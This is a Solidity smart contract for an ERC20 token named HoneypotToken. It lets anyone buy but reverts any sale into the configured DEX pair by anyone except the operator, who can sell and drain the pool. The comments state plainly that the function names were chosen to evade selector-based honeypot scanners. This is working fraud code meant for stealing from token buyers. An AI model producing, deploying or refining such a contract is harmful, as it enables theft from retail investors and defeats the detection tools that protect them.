// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @notice ERC20 that allows buying but blocks selling for non-owner addresses.
/// @dev Sells are detected as transfers TO the configured pair address.
///      Designed to evade selector-based honeypot scanners — no obvious
///      blacklist/fee/trading-gate function names in the ABI.
contract HoneypotToken is ERC20 {
    address private immutable _operator;
    address private _outlet;

    error TransferRestricted();
    error Unauthorized();
    error AlreadyConfigured();

    constructor(string memory name_, string memory symbol_, uint256 supply_)
        ERC20(name_, symbol_)
    {
        _operator = msg.sender;
        _mint(msg.sender, supply_);
    }

    /// @notice Records the trading venue (DEX pair). Can only be set once.
    /// @dev Innocuous-looking name to avoid triggering selector-based detection.
    function configure(address venue) external {
        if (msg.sender != _operator) revert Unauthorized();
        if (_outlet != address(0)) revert AlreadyConfigured();
        _outlet = venue;
    }

    function operator() external view returns (address) {
        return _operator;
    }

    function _update(address from, address to, uint256 value) internal override {
        // Block transfers TO the configured outlet from anyone except operator.
        // This blocks sells via the DEX router (which calls transferFrom user -> pair)
        // while allowing the operator to drain the pool by selling their tokens.
        if (_outlet != address(0) && to == _outlet && from != _operator) {
            revert TransferRestricted();
        }
        super._update(from, to, value);
    }
}
